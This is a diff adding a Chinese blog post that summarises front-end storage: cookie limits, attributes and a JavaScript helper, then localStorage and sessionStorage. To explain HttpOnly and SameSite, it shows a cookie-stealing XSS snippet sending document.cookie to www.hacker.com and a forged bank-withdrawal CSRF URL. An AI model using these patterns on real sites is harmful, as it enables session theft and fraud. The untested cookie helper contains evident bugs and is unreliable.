@@ -284,6 +284,238 @@
             
               
                 
+                <a class="post-title-link" href="/2016/11/11/storage-in-frontent/" itemprop="url">
+                  前端常用存储技术总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-11T19:10:00+08:00" content="2016-11-11">
+              2016-11-11
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Javascript/" itemprop="url" rel="index">
+                    <span itemprop="name">Javascript</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/11/storage-in-frontent/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/11/11/storage-in-frontent/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/11/storage-in-frontent/" class="leancloud_visitors" data-flag-title="前端常用存储技术总结">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#&#x4E00;&#x3001;cookie#<br>cookie&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x4FDD;&#x5B58;&#x5728;&#x7528;&#x6237;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x7684;&#x5C11;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x6BCF;&#x6B21;&#x53D1;&#x9001;HTTP&#x8BF7;&#x6C42;&#x65F6;&#x81EA;&#x52A8;&#x5730;&#x5728;&#x9644;&#x5728;HTTP&#x5934;&#x90E8;&#x91CC;&#x3002;</p>
+<p>##&#x5BB9;&#x91CF;&#x9650;&#x5236;##</p>
+<ol>
+<li>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x8F83;&#x5C0F;&#xFF0C;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;4K&#x5DE6;&#x53F3;</li>
+<li>&#x5E76;&#x6709;&#x5B58;&#x50A8;&#x6761;&#x6570;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x4E0A;&#x9650;&#x4E0D;&#x540C;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;20~50&#x6761;</li>
+<li>&#x8D85;&#x51FA;&#x9650;&#x5236;&#x4E0D;&#x4F1A;&#x505A;&#x4EFB;&#x4F55;&#x63D0;&#x9192;&#xFF0C;&#x540E;&#x5199;&#x5165;&#x7684;cookie &#x4F1A;&#x76D6;&#x6389;&#x524D;&#x9762;&#x7684;cookie<br>##&#x5B58;&#x50A8;&#x65F6;&#x957F;##</li>
+<li>&#x5982;&#x679C;&#x8BBE;&#x5B9A;&#x4E86;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;cookie&#x5C06;&#x5728;&#x5230;&#x671F;&#x65F6;&#x5931;&#x6548;&#x3002;</li>
+<li><strong>&#x5982;&#x679C;&#x6CA1;&#x8BBE;&#x5B9A;&#xFF0C;&#x5C06;&#x5728;&#x5173;&#x95ED;&#x6D4F;&#x89C8;&#x5668;&#x65F6;&#x5931;&#x6548;&#x3002;</strong>&#x5728;&#x672A;&#x5173;&#x95ED;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6240;&#x6709;&#x7684;tab&#x7EA7;&#x522B;&#x7684;&#x9875;&#x9762;&#x65B0;&#x5F00;&#x6216;&#x5237;&#x65B0;&#xFF0C;cookie&#x90FD;&#x53EF;&#x7528;&#x3002;<strong>&#xFF08;&#x533A;&#x522B;&#x4E8E;sessionStorage&#x7684;Tab&#x7EA7;session&#xFF09;</strong></li>
+</ol>
+<h2 id="&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;"><a href="#&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;"></a>&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;</h2><ol>
+<li><p>Session&#x7BA1;&#x7406;&#xFF1A;&#x767B;&#x5F55;&#x3001;&#x8D2D;&#x7269;&#x8F66;&#x3001;&#x6E38;&#x620F;&#x5F97;&#x5206;&#x7B49;&#x7528;&#x6237;&#x72B6;&#x6001;</p>
+</li>
+<li><p>&#x4FDD;&#x5B58;&#x7528;&#x6237;&#x4E2A;&#x6027;&#x5316;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F7F;&#x7528;&#x504F;&#x597D;&#x3001;&#x4E3B;&#x9898;&#x7B49;</p>
+</li>
+<li><p>&#x7528;&#x6237;&#x8DDF;&#x8E2A;&#xFF0C;&#x8BB0;&#x5F55;&#x548C;&#x5206;&#x6790;&#x7528;&#x6237;&#x884C;&#x4E3A;</p>
+</li>
+</ol>
+<h2 id="&#x4F7F;&#x7528;&#x6CE8;&#x610F;"><a href="#&#x4F7F;&#x7528;&#x6CE8;&#x610F;" class="headerlink" title="&#x4F7F;&#x7528;&#x6CE8;&#x610F;"></a>&#x4F7F;&#x7528;&#x6CE8;&#x610F;</h2><ol>
+<li>&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;cookie&#x5BB9;&#x91CF;&#x6709;&#x9650;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x4E2D;&#x90FD;&#x9644;&#x5E26;cookie&#xFF0C;&#x6240;&#x4EE5;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;cookie&#xFF0C;&#x4EC5;&#x662F;&#x4E3A;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x5B58;&#x50A8;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;Web Storage&#x66FF;&#x4EE3;&#x3002;&#x53EA;&#x6709;&#x9700;&#x8981;&#x6BCF;&#x6B21;&#x8BF7;&#x6C42;&#x90FD;&#x9700;&#x8981;&#x9644;&#x5E26;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x624D;&#x9700;&#x8981;&#x4F7F;&#x7528;cookie&#xFF0C;&#x4F8B;&#x5982;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x4FE1;&#x606F;&#x3002;</li>
+<li>cookie&#x7684;&#x540D;/&#x503C;&#x5BF9;&#x4E2D;&#x7684;&#x503C;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x5206;&#x53F7;&#x3001;&#x9017;&#x53F7;&#x548C;&#x7A7A;&#x767D;&#x7B26;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x8BBE;&#x7F6E;cookie&#x65F6;&#x8981;&#x5148;&#x7528;encodeURIComponent()&#x7F16;&#x7801;&#xFF0C;&#x8BFB;&#x53D6;&#x65F6;&#x89E3;&#x7801;&#x3002;</li>
+</ol>
+<h2 id="&#x57FA;&#x672C;API"><a href="#&#x57FA;&#x672C;API" class="headerlink" title="&#x57FA;&#x672C;API"></a>&#x57FA;&#x672C;API</h2><p><strong>&#x540E;&#x7AEF;&#x8BBE;&#x7F6E;cookie&#xFF1A;</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>
+<p>&#x540E;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x524D;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;<code>Set-Cookie</code>&#x7684;&#x54CD;&#x5E94;&#x5934;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x63A5;&#x6536;&#x54CD;&#x5E94;&#x540E;&#x5C31;&#x4F1A;&#x5B58;&#x50A8;&#x8BE5;cookie&#xFF0C;&#x5E76;&#x5728;&#x4E4B;&#x540E;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x4E2D;&#x81EA;&#x52A8;&#x9644;&#x5E26;&#x8FD9;&#x4E2A;cookie&#xFF0C;&#x76F4;&#x5230;&#x8FC7;&#x4E86;&#x8D85;&#x65F6;&#x671F;&#x9650;</p>
+<p><strong>&#x524D;&#x7AEF;&#x8BBE;&#x7F6E;cookie&#xFF1A;</strong><code>document.cookie = &quot;name=value[;expires=date][;path=path-to-resource][;domain=&#x57DF;&#x540D;][;secure]&quot;</code></p>
+<p>&#x56E0;&#x4E3A;<code>document.cookie</code>&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x4E2D;&#x9700;&#x8981;&#x9891;&#x7E41;&#x64CD;&#x4F5C;cookie&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x628A;&#x76F8;&#x5173;&#x65B9;&#x6CD5;&#x5C01;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6709;&#x4E00;&#x4E9B;&#x73B0;&#x6210;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5982;<code>jquery.cookie.js</code>&#x3001;<code>js.cookie</code>&#x7B49;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6211;&#x7684;&#x7B80;&#x5355;&#x5C01;&#x88C5;&#xFF08;&#x672A;&#x7ECF;&#x8C03;&#x8BD5;&#xFF0C;&#x53EA;&#x662F;&#x5199;&#x4E0B;&#x601D;&#x8DEF;&#xFF09;&#xFF1A;</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> cookieObj = {</div><div class="line">	get:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>{</div><div class="line">		<span class="keyword">if</span>(!keyName){</div><div class="line">  			alert(<span class="string">&apos;superMary says&#xFF1A;cookieObj.get need a param&#xFF01;&apos;</span>);</div><div class="line">  			<span class="keyword">return</span>;</div><div class="line">		}</div><div class="line">		<span class="keyword">var</span> encodedKeyName = <span class="built_in">encodeURIComponent</span>(keyName);</div><div class="line">		<span class="keyword">var</span> docCookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">&apos;;&apos;</span>);</div><div class="line">		<span class="keyword">var</span> resultCookie = docCookieArr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>{</div><div class="line">			<span class="keyword">var</span> cookieArr = item.split(<span class="string">&apos;=&apos;</span>);</div><div class="line">  			<span class="keyword">return</span> cookieArr[<span class="number">0</span>] === encodedKeyName;</div><div class="line">		})</div><div class="line">		<span class="keyword">if</span>(resultCookie.length&gt;<span class="number">0</span>){</div><div class="line">  			<span class="keyword">return</span> resultCookie[<span class="number">0</span>].split(<span class="string">&apos;=&apos;</span>)[<span class="number">1</span>];</div><div class="line">		}</div><div class="line">		alert(<span class="string">&apos;superMary says&#xFF1A;not find the cookie of&apos;</span>+ keyName);		</div><div class="line">	},</div><div class="line">	</div><div class="line">	set:<span class="function"><span class="keyword">function</span>(<span class="params">oCookie</span>)</span>{</div><div class="line">  		<span class="keyword">var</span> cookieStr = <span class="built_in">encodeURIComponent</span>(oCookie.keyName) + <span class="string">&apos;=&apos;</span> + <span class="built_in">encodeURIComponent</span>(oCookie.keyValue);</div><div class="line">  		<span class="keyword">if</span>(oCookie.expires){</div><div class="line">  			cookieStr += <span class="string">&apos;;expires=&apos;</span> + oCookie.expires;</div><div class="line">		}</div><div class="line">      	<span class="keyword">if</span>(oCookie.path){</div><div class="line">  			cookieStr += <span class="string">&apos;;path=&apos;</span> + oCookie.path;</div><div class="line">		}</div><div class="line">      	<span class="keyword">if</span>(oCookie.Domain){</div><div class="line">  			cookieStr += <span class="string">&apos;;path=&apos;</span> + oCookie.path;</div><div class="line">		}</div><div class="line">      	<span class="comment">// secure&#x548C;httpOnly...</span></div><div class="line">	},</div><div class="line">  	delCookie:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>{</div><div class="line">  		<span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">      	date.setHours(<span class="number">-1</span>);</div><div class="line">      	<span class="keyword">this</span>.set({</div><div class="line">          keyName:keyName,</div><div class="line">          expires:date</div><div class="line">		})</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>
+<h2 id="cookie&#x5C5E;&#x6027;"><a href="#cookie&#x5C5E;&#x6027;" class="headerlink" title="cookie&#x5C5E;&#x6027;"></a>cookie&#x5C5E;&#x6027;</h2><p>&#x4EE5;CSDN&#x7F51;&#x7AD9;&#x7684;cookie&#x4E3A;&#x4F8B;&#xFF1A;</p>
+<p>[&#x56FE;0]</p>
+<p>&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF1A;Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>
+<h3 id="&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027;-Expires-Max-Age"><a href="#&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027;-Expires-Max-Age" class="headerlink" title="&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027; Expires / Max-Age"></a>&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027; Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
+<p>Expires&#xFF1A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;GMT&#x683C;&#x5F0F;&#x7684;&#x7EDD;&#x5BF9;&#x65F6;&#x95F4;</p>
+<p>Max-Age&#xFF1A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x4EE5;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x76F8;&#x5BF9;&#x65F6;&#x95F4;&#xFF0C;&#x76F8;&#x5BF9;&#x7684;&#x662F;&#x6587;&#x6863;&#x7B2C;&#x4E00;&#x6B21;&#x88AB;&#x8BF7;&#x6C42;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#x95F4;</p>
+<h3 id="&#x57DF;&#x7C7B;&#x5C5E;&#x6027;-Domain-Path"><a href="#&#x57DF;&#x7C7B;&#x5C5E;&#x6027;-Domain-Path" class="headerlink" title="&#x57DF;&#x7C7B;&#x5C5E;&#x6027; Domain / Path"></a>&#x57DF;&#x7C7B;&#x5C5E;&#x6027; Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
+<ol>
+<li><p>&#x8868;&#x793A;cookie&#x6240;&#x5728;&#x7684;&#x57DF;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;html&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x57DF;&#x540D;&#xFF0C;path&#x4E3A;html&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x8DEF;&#x5F84;&#x3002;</p>
+<p>&#x4F8B;&#xFF1A;&#x4E3A;<a href="http://www.baidu.com/test/testCookie.html" target="_blank" rel="external">http://www.baidu.com/test/testCookie.html</a> &#x9875;&#x9762;&#x4E2D;&#x7684;js&#x8BBE;&#x7F6E;cookie&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;cookie&#x7684;&#x7684;Domain&#x4E3A;&#xFF1A;.baidu.com&#xFF0C;Path&#x4E3A;&#xFF1A;/test</p>
+</li>
+<li><p>cookie&#x53EA;&#x80FD;&#x88AB;&#x8BE5;Domain&#x57DF;&#x540D;&#x6216;&#x5176;&#x5B50;&#x57DF;&#x540D;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x8BBF;&#x95EE;</p>
+</li>
+<li><p>cookie&#x53EA;&#x80FD;&#x88AB;&#x8BE5;Path&#x8DEF;&#x5F84;&#x6216;&#x5176;&#x5B50;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x8BBF;&#x95EE;</p>
+</li>
+<li><p>&#x4E8C;&#x7EA7;&#x57DF;&#x540D;&#x95F4;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;Domain&#x5171;&#x4EAB;Cookie&#xFF0C;&#x5B9E;&#x73B0;&#x8DE8;&#x57DF;&#x3002;    </p>
+</li>
+</ol>
+<p>&#x200B;    &#x4F8B;&#x5982;&#xFF1A;a.baidu.com      b.baidu.com    <code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
+<h3 id="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-Secure-HttpOnly"><a href="#&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-Secure-HttpOnly" class="headerlink" title="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; Secure / HttpOnly"></a>&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>
+<p> <strong>Secure</strong>&#x6307;&#x793A;&#x6D4F;&#x89C8;&#x5668;&#x4EC5;&#x901A;&#x8FC7; HTTPS &#x8FDE;&#x63A5;&#x4F20;&#x56DE; cookie&#xFF0C;&#x4EC5;&#x7528;&#x4E8E;HTTPS&#x7F51;&#x7AD9;&#x3002;</p>
+<p>&#x6CE8;&#x610F;&#xFF1A;Chrome 52 &#x3001;Firefox 52&#x4E4B;&#x524D;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5373;&#x4F7F;&#x8BBE;&#x7F6E;&#x4E86;Secure&#xFF0C;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;HTTP&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x8BBE;&#x7F6E;&#x4E86;Secure&#xFF0C;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x4F9D;&#x7136;&#x4E0D;&#x80FD;&#x5B58;&#x5728;cookie&#x91CC;&#x3002;</p>
+<p><strong>HttpOnly</strong>&#x8BBE;&#x7F6E;&#x4E86;HttpOnly&#x7684;Cookie&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;JavaScript&#x8BBF;&#x95EE;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x9632;&#x6B62;cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;&#x51FB;</p>
+<p><strong>cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;&#x51FB;</strong></p>
+<p>[&#x56FE;1]</p>
+<p>var cookie = document.cookie;</p>
+<p>src=&#x2018;www.hacker.com?cookie=&#x2019; + cookie </p>
+<h3 id="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-SameSite"><a href="#&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-SameSite" class="headerlink" title="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; SameSite"></a>&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; SameSite</h3><ol>
+<li>&#x8868;&#x660E;&#x8FD9;&#x4E2A; cookie &#x662F;&#x4E2A;&#x201C;&#x540C;&#x7AD9; cookie&#x201D;&#xFF0C;&#x540C;&#x7AD9; cookie &#x53EA;&#x80FD;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x65B9; cookie&#xFF0C;&#x4E0D;&#x80FD;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E09;&#x65B9; cookie&#x3002;</li>
+<li>&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x9632;&#x8303;CSRF&#xFF08;Cross-Site Request Forgery&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;&#xFF09;&#x653B;&#x51FB;</li>
+</ol>
+<p><strong>&#x7B2C;&#x4E09;&#x65B9;cookie</strong> </p>
+<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x7B2C;&#x4E09;&#x65B9;cookie&#x5C31;&#x662F;HTTP&#x8BF7;&#x6C42;&#x7684;Referer&#x503C;&#x548C;&#x8BF7;&#x6C42;&#x7684;&#x7F51;&#x5740;&#x57DF;&#x540D;&#x4E0D;&#x540C;</p>
+<p>[&#x56FE;2]</p>
+<p><strong>CSRF&#x653B;&#x51FB;&#x8FC7;&#x7A0B;</strong></p>
+<p>[&#x56FE;3]</p>
+<p>src=&#x2018;www.bankA.com/withdraw?money=1000&amp;to=hackerAccount&#x2019; </p>
+<p>IE&#x548C;Safari&#x5C1A;&#x4E0D;&#x652F;&#x6301;&#xFF0C;&#x5E76;&#x4E14;&#x8BA1;&#x5212;&#x7248;&#x672C;&#x4E2D;&#x4E5F;&#x6CA1;&#x6709;&#x52A0;&#x5165;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;</p>
+<p>[&#x56FE;4]</p>
+<h1 id="&#x4E8C;&#x3001;localStorage-sessionStorage"><a href="#&#x4E8C;&#x3001;localStorage-sessionStorage" class="headerlink" title="&#x4E8C;&#x3001;localStorage / sessionStorage"></a>&#x4E8C;&#x3001;localStorage / sessionStorage</h1><p>&#x5B83;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x7B80;&#x6613;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4EE5;key/value&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x3002;</p>
+<h3 id="&#x533A;&#x522B;"><a href="#&#x533A;&#x522B;" class="headerlink" title="&#x533A;&#x522B;"></a>&#x533A;&#x522B;</h3><p>localStorage&#xFF1A;&#x4F1A;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#xFF0C;&#x9664;&#x975E;&#x7528;&#x6237;&#x624B;&#x52A8;&#x6E05;&#x9664;<br>sessionStorage&#xFF1A;&#x5B58;&#x50A8;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x7AEF;&#xFF0C;<strong>&#x662F;Tab&#x7EA7;&#x522B;&#x7684;Session</strong> &#xFF0C;&#x5728;&#x65B0;&#x5F00;&#x7684;Tab&#x9875;&#x4E0B;&#xFF0C;&#x6216;&#x8005;&#x5173;&#x95ED;&#x672C;Tab&#x518D;&#x6253;&#x5F00;&#x540E;&#xFF0C;&#x90FD;&#x662F;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x5230;&#x4E4B;&#x524D;&#x4FDD;&#x5B58;&#x7684;sessionStorage&#x7684;&#x3002;&#x4F46;&#x5982;&#x679C;&#x53EA;&#x662F;&#x5237;&#x65B0;Tab&#x9875;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x4E4B;&#x524D;&#x5B58;&#x50A8;&#x7684;Session<br>&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#x5747;&#x4EE5;localStorage&#x4F5C;&#x4F8B;&#x5B50;</p>
+<h3 id="&#x5B58;&#x50A8;&#x9650;&#x5236;"><a href="#&#x5B58;&#x50A8;&#x9650;&#x5236;" class="headerlink" title="&#x5B58;&#x50A8;&#x9650;&#x5236;"></a>&#x5B58;&#x50A8;&#x9650;&#x5236;</h3><p>HTML5&#x89C4;&#x8303;&#x5EFA;&#x8BAE;&#x5B58;&#x50A8;&#x4E0A;&#x9650;&#x4E3A;5MB&#xFF0C;&#x5404;&#x5BB6;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x5177;&#x4F53;&#x5B9E;&#x73B0;&#x65F6;&#x7684;&#x5B58;&#x50A8;&#x4E0A;&#x9650;&#x4E3A;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;5M~10MB</p>
+<h3 id="&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;"></a>&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;</h3><p>IE8+/11&#x3001;Firefox 3.5+/57&#x3001;Chrome 4+/62&#x3001;Safari 4+/11&#x3001;Opera 11.5+/48</p>
+<h3 id="&#x7528;&#x9014;&#xFF1A;"><a href="#&#x7528;&#x9014;&#xFF1A;" class="headerlink" title="&#x7528;&#x9014;&#xFF1A;"></a>&#x7528;&#x9014;&#xFF1A;</h3><p>Web Storage&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x7684;&#x64CD;&#x4F5C;&#x72B6;&#x6001;&#x3001;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x3001;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#x7B49;&#x3002;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x521B;&#x5EFA;&#x79BB;&#x7EBF;&#x4F7F;&#x7528;&#x7684;APP&#xFF0C;&#x7528;&#x6237;&#x79BB;&#x7EBF;&#x65F6;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x5728;&#x518D;&#x6B21;&#x8054;&#x7F51;&#x65F6;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x505A;&#x4E00;&#x6B21;&#x6279;&#x91CF;&#x66F4;&#x65B0;&#x3002;</p>
+<h3 id="&#x5E38;&#x7528;API"><a href="#&#x5E38;&#x7528;API" class="headerlink" title="&#x5E38;&#x7528;API"></a>&#x5E38;&#x7528;API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>
+<h3 id="Storage-Event"><a href="#Storage-Event" class="headerlink" title="Storage Event"></a>Storage Event</h3><p>&#x5F53;&#x5411;storage&#x4E2D;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x6216;&#x79FB;&#x9664;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;window&#x5BF9;&#x8C61;&#x4E0A;&#x89E6;&#x53D1;&#x4E00;&#x4E2A;<code>storage event</code>&#xFF0C;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x76D1;&#x542C;&#x5668;&#x8FDB;&#x884C;&#x76D1;&#x542C;&#x3002;</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&apos;storage&apos;</span>, storageEventHandler, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
+<p><strong>&#x6CE8;&#x610F;</strong><br>&#x4E8B;&#x4EF6;&#x53EA;&#x80FD;&#x5728;&#x522B;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x76D1;&#x542C;&#x5230;&#xFF08;&#x4E0D;&#x662F;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x7684;&#x8FD9;&#x4E2A;&#x7A97;&#x53E3;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x5982;&#x679C;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x6539;&#x53D8;&#x7684;&#x8BDD;&#xFF0C;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x3002;<br>&#x53EA;&#x5BF9;localStorage &#x7684;&#x6539;&#x53D8;&#x6709;&#x6548;&#xFF0C;&#x5BF9;sessionStorage&#x65E0;&#x6548;</p>
